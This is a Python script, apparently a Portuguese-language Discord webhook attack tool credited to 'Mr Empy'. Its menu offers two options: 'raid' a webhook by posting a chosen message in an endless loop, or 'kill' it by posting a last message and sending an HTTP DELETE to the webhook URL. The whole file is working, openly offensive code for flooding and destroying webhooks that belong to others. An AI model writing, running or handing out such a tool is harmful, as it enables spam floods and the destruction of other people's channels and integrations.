#!/usr/bin/env python3
# coding: iso-8859-1 -*-
import requests
import os
import time
from colorama import Fore
from dhooks import Webhook
import json
import platform

platform = platform.system()

def banner():
    print(f'''{Fore.LIGHTMAGENTA_EX}
    _______       ____  __            __
   / ____/ |     / / / / /___  ____  / /__
  / /_   | | /| / / /_/ / __ \/ __ \/ //_/
 / __/   | |/ |/ / __  / /_/ / /_/ / ,<
/_/      |__/|__/_/ /_/\____/\____/_/|_|

{Fore.LIGHTMAGENTA_EX}     +-------------------------+
     �{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTMAGENTA_EX}�
     �{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTMAGENTA_EX}�
     +-------------------------+
''')

def main():
    banner()
    print(f'{Fore.LIGHTMAGENTA_EX}[01] {Fore.LIGHTCYAN_EX}Raidar Webhook')
    print(f'{Fore.LIGHTMAGENTA_EX}[02] {Fore.LIGHTCYAN_EX}Matar Webhook')

    select = input(f'\n{Fore.LIGHTCYAN_EX}Selecione uma Op��o: {Fore.LIGHTWHITE_EX}')
    if select == '1' or select == '01':
        print('\n')
        raid()

    if select == '2' or select == '02':
        print('\n')
        kill()

def raid():
    wh = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Webhook: ')
    msg = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Mensagem: ')
    hook = Webhook(wh)
    count = 0
    print('\n')

    while True:
        count += 1
        hook.send(msg)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Mensagem Enviada: {Fore.LIGHTGREEN_EX}{str(count)}')

def kill():
    wh = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Webhook: ')
    msg = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} �ltima Mensagem: ')
    hook = Webhook(wh)
    hook.send(msg)
    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Mensagem Enviada')

    r = requests.delete(wh)

    if r.status_code == 204:
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Webhook Morto com Sucesso!')
    else:
        print(f'{Fore.LIGHTRED_EX}[-]{Fore.LIGHTWHITE_EX} Erro na hora de Matar o Webhook')


if __name__ == '__main__':
    if platform == 'Windows':
        os.system('cls')
    else:
        os.system('clear')
    main()
